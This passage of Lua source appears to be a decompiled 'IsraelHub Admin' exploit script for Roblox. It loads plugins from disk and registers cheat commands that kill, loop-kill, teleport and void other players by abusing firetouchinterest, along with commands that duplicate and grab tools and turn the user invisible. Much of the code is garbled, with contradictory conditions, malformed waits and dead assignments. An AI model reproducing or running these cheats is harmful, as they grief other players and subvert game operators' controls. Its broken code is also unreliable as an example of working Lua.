        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } or readfile) and (not isfolder("IsraelHub Admin") and {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } and not isfolder("IsraelHub Admin/plugin-conf.json") or not isfolder("IsraelHub Admin/chatlogs")) then
        (function(a)
          if isfolder("IsraelHub Admin") and a then
            delfolder("IsraelHub Admin")
            writefile("IsraelHub Admin/config.json", (va:JSONEncode(vb)))
            writefile("IsraelHub Admin/admin/pluings/plugin-conf.json", (va:JSONEncode(vc)))
          else
            makefolder("IsraelHub Admin")
            makefolder("IsraelHub Admin/plugins")
            makefolder("IsraelHub Admin/chatlogs")
            writefile("IsraelHub Admin/config.json", (va:JSONEncode(vb)))
            writefile("IsraelHub Admin/plugins/plugin-conf.json", (va:JSONEncode(vc)))
          end
        end)()
      end
      for fbQ, fbW in next, {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } or {}, nil do
        (function(a)
          if a then
            return
          end
          if a and not a then
            return vc.Notify(LocalPlayer, "Plugin not loaded.", ("Plugin %s was not loaded as it is on the disabled list."):format(a.Name))
          end
          if #vd.keys(a) < 3 then
            if a or a then
            end
            return nil
          end
          if not a then
            vc.Notify(LocalPlayer, "Plugin loading", ("Plugin %s is being loaded."):format(a.Name))
          end
          if a and pcall(a.Init) and not pcall(a.Init) then
            return vc.Notify(LocalPlayer, "Plugin Fail", ("there is an error in plugin Init %s: %s"):format(a.Name, pcall(a.Init)))
          end
          if pcall(a.Init) then
          end
          for fh, fj in next, {}, nil do
            if #vd.keys(fj) < 3 then
              vc.Notify(LocalPlayer, "Plugin Command Fail", ("Command %s is missing information"):format(fj.Name))
            else
              if pcall(a.Init) then
              end
              if pcall(a.Init) then
              end
              vg(fj.Name, {}, fj.Description .. " - " .. a.Author, {}, fj.Func)
              if not pcall(a.Init) then
                vh.Frame.List:FindFirstChild(fj.Name):Destroy()
              end
              vc.Hover(vj:Clone(), "BackgroundColor3")
              vc.ToolTip(vj:Clone(), fj.Name .. "\n" .. fj.Description .. " - " .. a.Author)
              vj:Clone().CommandText.RichText = true
              if pcall(a.Init) or pcall(a.Init) then
              end
              vj:Clone().CommandText.Text = ("%s %s %s"):format(fj.Name, "", vc.TextFont("[PLUGIN]", {
                77,
                255,
                255
              }))
              vj:Clone().Name = fj.Name
              vj:Clone().Visible = true
              vj:Clone().Parent = vh.Frame.List
              if not pcall(a.Init) then
                vc.Notify(LocalPlayer, "Plugin Command Loaded", ("Command %s loaded successfully"):format(fj.Name))
              end
            end
          end
        end)(fbW[2]())
      end
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("refreshplugins", {
        "rfp",
        "refresh",
        "reload"
      }, "Loads all new plugins.", {}, function()
        if not va then
          return "your exploit does not support plugins"
        end
        vb = vc()
        vd = vb.PluginDebug
        ve = vg.map(vg.filter(listfiles("IsraelHub Admin/plugins"), function(a, b)
          return b:split(".")[#b:split(".")]:lower() == "lua"
        end), function(a, b)
          return {
            b:split("\\")[2],
            loadfile(b)
          }
        end)
        for fd, fe in next, ve, nil do
          vh(fe[2]())
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("commandcount", {"cc"}, "shows you how many commands there is in IsraelHub Admin", {}, function(a)
        va.Notify(a, "Amount of Commands", ("There are currently %s commands."):format(#vb.filter(vc, function(a, b)
          return va.indexOf(vb, b) == a
        end)))
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("walkspeed", {"ws"}, "changes your walkspeed to the second argument", {}, function(a, b, c)
        c[1] = va().WalkSpeed
        vb(va(), "WalkSpeed")
        va().WalkSpeed = b[1] or 16
        return "your walkspeed is now " .. va().WalkSpeed
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("jumppower", {"jp"}, "changes your jumpower to the second argument", {}, function(a, b, c)
        c[1] = va().JumpPower
        vb(va(), "JumpPower")
        va().JumpPower = b[1] or 50
        return "your jumppower is now " .. va().JumpPower
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("hipheight", {"hh"}, "changes your hipheight to the second argument", {}, function(a, b, c)
        c[1] = va().HipHeight
        vb(va(), "HipHeight")
        va().HipHeight = b[1] or 0
        return "your hipheight is now " .. va().HipHeight
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("kill", {"tkill"}, "kills someone", {
        "1",
        1,
        3
      }, function(a, b)
        for fl, fm in next, va(b[1]), nil do
        end
        for fl, fm in next, va(b[1]), nil do
          if #va(b[1]) == 1 and not b and not b then
            LocalPlayer.Character:Destroy()
            LocalPlayer.CharacterAdded:Wait()
            LocalPlayer.Character:WaitForChild("Humanoid")
            wait()
          end
        end
        vg()
        coroutine.wrap(function()
          for fd, fe in next, va, nil do
            if not va then
              if not va then
                if va then
                end
                vd.Notify(LocalPlayer, nil, fe.Name .. " is sitting down, could not kill")
                break
              end
              if not (vg[LocalPlayer.Name] <= vg[fe.Name]) or va then
                if va then
                end
              elseif va then
                break
              end
              vk((vb():FindFirstChildWhichIsA("Tool")))
              vb():FindFirstChildWhichIsA("Tool").Parent = vb()
              vb():FindFirstChildWhichIsA("Tool").Handle.Size = Vector3.new(4, 4, 4)
              for fm, fo in next, vb():FindFirstChildWhichIsA("Tool"):GetDescendants() do
                if fo:IsA("Sound") then
                  fo:Destroy()
                end
              end
              vl(vb():FindFirstChildWhichIsA("Tool"), vj(fe).CFrame * CFrame.new(0, 6, 0))
              firetouchinterest(vj(fe), vb():FindFirstChildWhichIsA("Tool").Handle, 0)
              wait()
              firetouchinterest(vj(fe), vb():FindFirstChildWhichIsA("Tool").Handle, 1)
            else
              if va then
              end
              vd.Notify(LocalPlayer, "Fail", fe.Name .. " is dead or does not have a root part, could not kill.")
            end
          end
        end)()
        vc():ChangeState(15)
        wait(0,3)
        LocalPlayer.Character:Destroy()
        LocalPlayer.CharacterAdded:Wait()
        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = vb().CFrame
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("kill2", {}, "another variant of kill", {1, "1"}, function(a, b)
        for fj, fk in next, va(b[1]), nil do
        end
        vd()
        wait(Players.RespawnTime - 0,09)
        Humanoid2 = vg((vc():FindFirstChildWhichIsA("Humanoid")))
        for fl, fm in next, va(b[1]), nil do
          if #va(b[1]) == 1 and {
            [fk.Name] = vb[LocalPlayer.Name] < vb[fk.Name]
          }[fm.Name] and not b then
            LocalPlayer.CharacterAdded:Wait()
            LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = ve().CFrame
            wait(0,1)
            Humanoid2 = vg()
          end
        end
        vj()
        coroutine.wrap(function()
          for fd, fe in next, va, nil do
            if vb(fe) then
              if vc(fe) then
                vd.Notify(ve or LocalPlayer, nil, fe.Name .. " is sitting down, could not kill")
              elseif not va and vh(fe) then
                if #va == 1 then
                  Destroy = true
                else
                end
              elseif not va then
                vk(LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vb():FindFirstChildWhichIsA("Tool"))
                LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vb():FindFirstChildWhichIsA("Tool").Parent = vb()
                LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vb():FindFirstChildWhichIsA("Tool").Handle.Size = Vector3.new(4, 4, 4)
                vl(LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vb():FindFirstChildWhichIsA("Tool"), vj(fe).CFrame * CFrame.new(0, 6, 0))
                firetouchinterest(vj(fe), LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vb():FindFirstChildWhichIsA("Tool").Handle, 0)
                wait()
                firetouchinterest(vj(fe), LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vb():FindFirstChildWhichIsA("Tool").Handle, 1)
              end
            else
              vd.Notify(ve or LocalPlayer, "Fail", fe.Name .. " is dead or does not have a root part, could not kill.")
            end
          end
        end)()
        Humanoid2:ChangeState(15)
        if Destroy then
          wait(0,2)
          vd()
          Destroy = nil
        end
        LocalPlayer.CharacterAdded:Wait()
        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = ve().CFrame
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("loopkill", {}, "loopkill loopkills a character", {3, "1"}, function(a, b, c)
        for fj, fk in next, va(b[1]), nil do
          c[9 + 1] = fk
        end
        repeat
          vb().Humanoid:UnequipTools()
          vc()
          vd(Humanoid):ChangeState(15)
          if not b then
            vg.Notify(LocalPlayer, "Loopkill", "the player is in r6 it will only kill every 2 respawns")
          end
          for fk, fl in next, va(b[1]), nil do
            for fr, fs in next, LocalPlayer.Backpack:GetChildren() do
              if fs:IsA("Tool") then
                vj(fl)
                fs.Parent = vb()
                for fq = 1, 3 do
                  if not b then
                    firetouchinterest(vh(fl), fs.Handle, 0)
                    wait()
                    firetouchinterest(vh(fl), fs.Handle, 1)
                  end
                end
                fs.Handle.Size = fs.Handle.Size
              end
            end
          end
          wait(0,2)
          LocalPlayer.Character:Destroy()
          LocalPlayer.CharacterAdded:Wait()
          LocalPlayer.Character:WaitForChild("HumanoidRootPart")
          wait(1)
        until not next(vk("loopkill").CmdExtra) or b
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unloopkill", {"unlkill"}, "unloopkills a user", {3, "1"}, function(a, b)
        vb("loopkill").CmdExtra = {}
        return "loopkill disabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("bring", {}, "brings a user", {1}, function(a, b)
        if a ~= LocalPlayer and va(b[1])[1] == LocalPlayer then
          vb().CFrame = vb(a).CFrame * CFrame.new(-5, 0, 0)
        else
          for fk, fl in next, va(b[1]), nil do
          end
          vd()
          ve()
          for fk, fl in next, va(b[1]), nil do
            if #va(b[1]) == 1 and {
              [fl.Name] = vc[LocalPlayer.Name] < vc[fl.Name]
            }[fl.Name] and vg(fl) then
              LocalPlayer.Character:Destroy()
              LocalPlayer.CharacterAdded:Wait()
              LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = vb(a).CFrame
              wait(0,1)
              ve()
            end
          end
          for fk, fl in next, va(b[1]), nil do
            if vh(fl) then
              if vj(fl) then
                vk.Notify(a or LocalPlayer, nil, fl.Name .. " is sitting down, could not bring")
              elseif vc[LocalPlayer.Name] <= vc[fl.Name] and not b then
              elseif not b then
                vl(LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vh():FindFirstChildWhichIsA("Tool"))
                LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vh():FindFirstChildWhichIsA("Tool").Parent = vh()
                LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vh():FindFirstChildWhichIsA("Tool").Handle.Size = Vector3.new(4, 4, 4)
                for fs, ft in next, LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vh():FindFirstChildWhichIsA("Tool"):GetDescendants() do
                  if not b then
                    ft:Destroy()
                  end
                end
                for fs = 1, 3 do
                  if not b then
                    firetouchinterest(vb(fl), LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vh():FindFirstChildWhichIsA("Tool").Handle, 0)
                    wait()
                    firetouchinterest(vb(fl), LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vh():FindFirstChildWhichIsA("Tool").Handle, 1)
                    vm(LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vh():FindFirstChildWhichIsA("Tool"), vb(a).CFrame * CFrame.new(-5, 0, 0))
                  end
                end
              end
            else
              vk.Notify(a or LocalPlayer, "Fail", fl.Name .. " is dead or does not have a root part, could not bring.")
            end
          end
          wait(0,2)
          LocalPlayer.Character:Destroy()
          LocalPlayer.CharacterAdded:Wait()
          LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = vb(a).CFrame
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("bring2", {}, "another variant of bring", {
        1,
        3,
        "1"
      }, function(a, b)
        for fj, fk in next, va(b[1]), nil do
        end
        vd()
        wait(Players.RespawnTime - 0,3)
        vg()
        Humanoid2 = vh((vc():FindFirstChildWhichIsA("Humanoid")))
        for fl, fm in next, va(b[1]), nil do
          if #va(b[1]) == 1 and not b and vj(fm) then
            LocalPlayer.CharacterAdded:Wait()
            LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = ve().CFrame
            wait(0,1)
            Humanoid2 = vh()
          end
        end
        coroutine.wrap(function()
          for fd, fe in next, va, nil do
            if vb(fe) then
              if vc(fe) then
                if va then
                end
                vd.Notify(LocalPlayer, nil, fe.Name .. " is sitting down, could not bring")
              elseif not va and not va then
                if #va == 1 then
                  Destroy = true
                else
                end
              elseif not va then
                vk(LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vb():FindFirstChildWhichIsA("Tool"))
                LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vb():FindFirstChildWhichIsA("Tool").Parent = vb()
                LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vb():FindFirstChildWhichIsA("Tool").Handle.Size = Vector3.new(4, 4, 4)
                vl(LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vb():FindFirstChildWhichIsA("Tool"), vm * CFrame.new(-5, 0, 0))
                firetouchinterest(vj(fe), LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vb():FindFirstChildWhichIsA("Tool").Handle, 0)
                wait()
                firetouchinterest(vj(fe), LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vb():FindFirstChildWhichIsA("Tool").Handle, 1)
              end
            else
              vd.Notify(ve or LocalPlayer, "Fail", fe.Name .. " is dead or does not have a root part, could not bring.")
            end
          end
        end)()
        if Destroy then
          wait(0,2)
          LocalPlayer.Character:Destroy()
          Destroy = nil
        end
        LocalPlayer.CharacterAdded:Wait()
        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = ve().CFrame
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("void", {}, "voids a player", {
        "1",
        1,
        3
      }, function(a, b)
        for fj, fk in next, va(b[1]), nil do
        end
        vd()
        wait(Players.RespawnTime - 0,3)
        vg()
        Humanoid2 = vh((vc():FindFirstChildWhichIsA("Humanoid")))
        for fl, fm in next, va(b[1]), nil do
          if #va(b[1]) == 1 and not b and not b then
            LocalPlayer.CharacterAdded:Wait()
            LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = ve().CFrame
            wait(0,1)
            Humanoid2 = vh()
          end
        end
        coroutine.wrap(function()
          for fd, fe in next, va, nil do
            if vb(fe) then
              if not va then
                vd.Notify(ve or LocalPlayer, nil, fe.Name .. " is sitting down, could not void")
              elseif vg[fe.Name] and not va then
                if #va == 1 then
                  Destroy = true
                else
                end
              elseif va then
              else
                vk(LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vb():FindFirstChildWhichIsA("Tool"))
                LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vb():FindFirstChildWhichIsA("Tool").Parent = vb()
                LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vb():FindFirstChildWhichIsA("Tool").Handle.Size = Vector3.new(4, 4, 4)
                firetouchinterest(vj(fe), LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vb():FindFirstChildWhichIsA("Tool").Handle, 0)
                wait()
                firetouchinterest(vj(fe), LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or vb():FindFirstChildWhichIsA("Tool").Handle, 1)
                vj().CFrame = CFrame.new(0, 9000000000, 0)
              end
            else
              vd.Notify(ve or LocalPlayer, "Fail", fe.Name .. " is dead or does not have a root part, could not void.")
            end
          end
        end)()
        if Destroy then
          wait(0,2)
          LocalPlayer.Character:Destroy()
          Destroy = nil
        end
        LocalPlayer.CharacterAdded:Wait()
        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = ve().CFrame
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("view", {"v"}, "views a user", {3, "1"}, function(a, b)
        for fh, fj in next, va(b[1]), nil do
          if b then
          end
          vb.Camera.CameraSubject = vc()
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unview", {"unv"}, "unviews a user", {3}, function(a, b)
        va.Camera.CameraSubject = vb()
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("loopview", {}, "loopviews a user", {3, "1"}, function(a, b, c)
        for fj, fk in next, va(b[1]), nil do
          vb.Camera.CameraSubject = vc(fk) or vc()
          c[fk.Name] = vb.Camera:GetPropertyChangedSignal("CameraSubject"):Connect(function()
            if va.Camera then
            end
            va.Camera.CameraSubject = vb()
          end)
          vd(fk, (vb.Camera:GetPropertyChangedSignal("CameraSubject"):Connect(function()
            if va.Camera then
            end
            va.Camera.CameraSubject = vb()
          end)))
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unloopview", {}, "unloopviews a user", {3}, function(a, b)
        for fj, fk in next, va("loopview").CmdExtra, nil do
          for fp, fn in next, vb(b[1]), nil do
            if fj == fn.Name then
              fk:Disconnect()
            end
          end
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("invisble", {"invis"}, "makes yourself invisible", {}, function()
        va().CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
        wait(0,2)
        va():Destroy()
        va():Clone().CFrame = va().CFrame
        va():Clone().Parent = vb()
        return "you are now invisible"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("dupetools", {"dp"}, "dupes your tools", {
        "1",
        1,
        {"protect"}
      }, function(a, b, c)
        if b then
          return "amount must be a number"
        end
        va().Humanoid:UnequipTools()
        c[1] = true
        for fm = 1, tonumber(b[1]) do
          if b then
            break
          end
          va().Humanoid:UnequipTools()
          vd()
          if not b then
            delay(game.Players.RespawnTime - 0,3, function()
              va.FallenPartsDestroyHeight = -math.huge
              vb = vc().CFrame
              vd(vc(), "Anchored")
              vc().CFrame = CFrame.new(0, 1000000000, 0)
              vc().Anchored = true
            end)
          end
          wait(game.Players.RespawnTime - 0,05)
          if b then
          end
          vj(Humanoid)
          for ft, fu in next, vb.filter(LocalPlayer.Backpack:GetChildren(), function(a, b)
            return b:IsA("Tool")
          end), nil do
            vh(fu, "Parent")
            fu.Parent = LocalPlayer.Character
            fu.Parent = ve
          end
          LocalPlayer.CharacterAdded:Wait()
          LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = vg().CFrame
          for ft, fu in next, {
            [18 + 1] = fu
          }, nil do
            if not b then
              firetouchinterest(fu.Handle, vg(), 0)
              firetouchinterest(fu.Handle, vg(), 1)
            end
          end
          repeat
            wait()
            LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = vg().CFrame
          until vg().CFrame == vg().CFrame
          wait(0,4)
          va().Humanoid:UnequipTools()
        end
        return ("successfully duped %d tool (s)"):format(#LocalPlayer.Backpack:GetChildren() - #vb.filter(LocalPlayer.Backpack:GetChildren(), function(a, b)
          return b:IsA("Tool")
        end))
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("stopdupe", {}, "stops the dupe", {}, function()
        if va("dupetools").CmdExtra then
          return "you are not duping tools"
        end
        va("dupetools").CmdExtra[1] = false
        return "dupetools stopped"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("savetools", {"st"}, "saves your tools", {1, 3}, function(a, b)
        va():UnequipTools()
        for fj, fk in next, LocalPlayer.Backpack:GetChildren(), nil do
          vc(fk, "Parent")
          fk.Parent = vb()
          fk.Parent = vd
          firetouchinterest(vd:WaitForChild(fk.Name).Handle, ve(), 0)
          wait()
          firetouchinterest(fk.Handle, ve(), 1)
          vb():WaitForChild(fk.Name).Parent = LocalPlayer.Backpack
        end
        vg.Notify(a, nil, "Tools are now saved")
        va().Died:Wait()
        va():UnequipTools()
        wait(Players.RespawnTime - wait())
        for fj, fk in next, LocalPlayer.Backpack:GetChildren(), nil do
          if not b and fk:FindFirstChild("Handle") then
            fk.Parent = vb()
            fk.Parent = vd
          end
        end
        LocalPlayer.CharacterAdded:Wait()
        LocalPlayer.Character:WaitForChild("HumanoidRootPart")
        for fj, fk in next, LocalPlayer.Backpack:GetChildren(), nil do
          firetouchinterest(fk.Handle, ve(), 0)
          wait()
          firetouchinterest(fk.Handle, ve(), 1)
        end
        return "tools recovered??"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("givetools", {}, "gives tools to a player", {
        "1",
        3,
        1
      }, function(a, b)
        LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Name = "1"
        LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):Clone().Parent = LocalPlayer.Character
        LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):Clone().Name = "Humanoid"
        vc.Camera.CameraSubject = LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):Clone()
        wait()
        LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):Destroy()
        for fl, fm in next, LocalPlayer:GetChildren() do
          if fm:IsA("Tool") then
            fm.Parent = LocalPlayer.Backpack
          end
        end
        LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):Clone():ChangeState(15)
        for fl, fm in next, va(b[1]), nil do
          for fs, ft in next, LocalPlayer.Backpack:GetChildren() do
            if ft:IsA("Tool") then
              ft.Parent = vd()
              for fq = 1, 3 do
                if not b then
                  firetouchinterest(vb(fm), ft.Handle, 0)
                  wait()
                  firetouchinterest(vb(fm), ft.Handle, 1)
                end
              end
            end
          end
        end
        wait(0,2)
        LocalPlayer.Character:Destroy()
        LocalPlayer.CharacterAdded:Wait()
        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = vb().CFrame
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("grabtools", {"gt"}, "grabs tools in the workspace", {3}, function(a, b)
        vc():UnequipTools()
        for fj, fk in next, va.filter(vb:GetDescendants(), function(a, b)
          if not b then
          end
          return (b:FindFirstChild("Handle"))
        end), nil do
          if not b then
            firetouchinterest(fk.Handle, vd(), 0)
            wait()
            firetouchinterest(fk.Handle, vd(), 1)
          end
        end
        wait(0,4)
        vc():UnequipTools()
        return ("grabbed %d tool (s)"):format(#LocalPlayer.Backpack:GetChildren() - #LocalPlayer.Backpack:GetChildren())
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("autograbtools", {
        "agt",
        "loopgrabtools",
        "lgt"
      }, "once a tool is added to workspace it will be grabbed", {3}, function(a, b, c)
